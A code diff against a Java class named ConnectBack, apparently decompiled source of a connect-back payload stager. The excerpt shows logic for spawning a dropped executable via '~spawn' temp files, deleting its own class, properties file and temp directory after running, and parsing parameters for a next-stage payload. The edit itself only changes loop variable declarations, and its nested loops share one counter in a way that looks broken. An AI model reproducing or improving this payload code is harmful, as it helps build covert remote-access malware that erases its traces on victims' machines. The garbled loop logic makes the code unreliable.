@@ -202,7 +202,7 @@ public class ConnectBack extends ClassLoader implements Runnable {
 
       int spawn = Integer.parseInt(props.getProperty("Spawn", "0"));
       String droppedExecutable = props.getProperty("DroppedExecutable");
-
+      int i;
       if (spawn > 0) {
          props.setProperty("Spawn", String.valueOf(spawn - 1));
          droppedFile = File.createTempFile("~spawn", ".tmp");
@@ -229,7 +229,7 @@ public class ConnectBack extends ClassLoader implements Runnable {
          Thread.sleep(2000L);
          File[] files = new File[]{classFile, classFile.getParentFile(), propFile, tempDir};
 
-         for(int i = 0; i < files.length; ++i) {
+         for(i = 0; i < files.length; ++i) {
             for(i = 0; i < 10 && !files[i].delete(); ++i) {
                files[i].deleteOnExit();
                Thread.sleep(100L);
@@ -298,7 +298,7 @@ public class ConnectBack extends ClassLoader implements Runnable {
          StringTokenizer stageParamTokenizer = new StringTokenizer("Payload -- " + props.getProperty("StageParameters", ""), " ");
          String[] stageParams = new String[stageParamTokenizer.countTokens()];
 
-         for(int i = 0; i < stageParams.length; ++i) {
+         for(i = 0; i < stageParams.length; ++i) {
             stageParams[i] = stageParamTokenizer.nextToken();
          }
 
